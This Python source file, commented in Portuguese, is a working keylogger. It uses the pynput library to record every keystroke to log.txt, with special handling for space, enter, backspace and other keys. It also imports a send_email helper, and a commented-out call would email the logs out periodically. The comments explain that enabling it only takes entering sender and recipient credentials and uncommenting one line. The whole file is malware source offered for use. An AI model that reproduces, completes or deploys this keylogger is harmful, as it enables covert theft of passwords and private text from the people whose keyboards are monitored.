from pynput import keyboard     # essa lib "pynput" que permite facil acesso a eventos do teclado
import send_email

IGNORAR = {                     # lista de teclas ignoradas para visualização mais limpa dos dados
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
}

# função principal do keylogger - é chamada a cada evento no teclado
def on_onpress(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as f:   # tenta abrir o arquivo "log.txt" e gravar qual tecla foi clicada
            f.write(key.char)

    except AttributeError:                                  # caso falhe na tentativa, que pode acontecer por teclas de atividade
        with open("log.txt", "a", encoding="utf-8") as f:   # [SPACE], [ENTER], [ESC], e outras, então é direcionado a uma se-
            if key == keyboard.Key.space:                   # quência de tratamentos, em caso de [SPACE] registra " " e etc.
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write("[<]")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            elif key in IGNORAR:                            # caso esteja na lista para ser ignorado, então deve ser ignorado
                pass
            else:
                f.write(f"[{key}]")                         # caso não esteja na lista de ignorados e não seja conhecido, é registrado o valor interno da tecla ente []

# metodo de start da peração - essa função ativa o keylogger
with keyboard.Listener(on_press=on_onpress) as listener:

    """ essa função, enviar_email, importada do script "send_email", envia emails com os logs de tempos em tempos
    para mais detalhes dessa função, examine o script dela, porém embora esteja aqui, ela ficara comentada, ou seja
    este código, por padrão, não envia emails, pois essa função não esta com as credenciais cadastradas, de email de
    Origem, sua senha, nem email de Destino. 

    Caso queira usar basta configurar essas credencias no outro script e descomentar a função aqui abaixo comentada.
    """
    # send_email.enviar_email()
    listener.join()                                         # inicia o listener do teclado
        